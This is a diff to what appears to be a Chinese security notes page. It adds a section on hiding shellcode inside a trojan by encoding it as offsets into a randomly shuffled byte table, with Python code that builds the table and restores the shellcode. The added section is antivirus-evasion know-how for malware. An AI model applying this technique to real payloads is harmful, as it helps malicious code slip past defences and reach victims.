@@ -126,6 +126,51 @@ int main()
 
 脚本小子的任务完成了。
 
+## 抽象成算法
+
+这个时候，仔细详细我们真的需要这个作为字符字典的文件么，我们真的需要月亮么\(不好意思串戏了\)，如果我们找不到这也的文件怎么办，其实我们并不是真的需要这样一个字典，而且我确实没有找到从xp-win10不变的文件。
+
+其实我们只是需要一张能作为字典的字符表，这样我们的这个思路就抽象成了凯撒密码算法（略略略），万物基于算法定律呗。
+
+我们把这张替换表硬编码进木马内，就避免作为参照物的文件失效，具体代码如下：
+
+```text
+import random
+
+buf =  b""
+buf += b"\xbb\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5"
+
+dict = [i for i in range(256)]
+random.shuffle(dict)
+
+
+offsettable=[];
+for i in range(len(buf)):
+	for p in range(len(dict)):
+		if  ord(chr(dict[p])) == ord(chr(buf[i])):
+			offsettable.append(p)
+			break
+
+#生成偏移表
+print("random dict generate success")
+print(dict)
+if len(offsettable) == len(buf):print("shellcode offset tables generate success");
+print(offsettable)
+
+#测试还原shellcode
+"""
+
+shellcode=[]
+for i in offsettable:
+	shellcode.append(dict[i])
+
+"""
+```
+
+```text
+
+```
+
 ## LINKS
 
 {% embed url="https://www.freebuf.com/articles/system/190740.html" %}
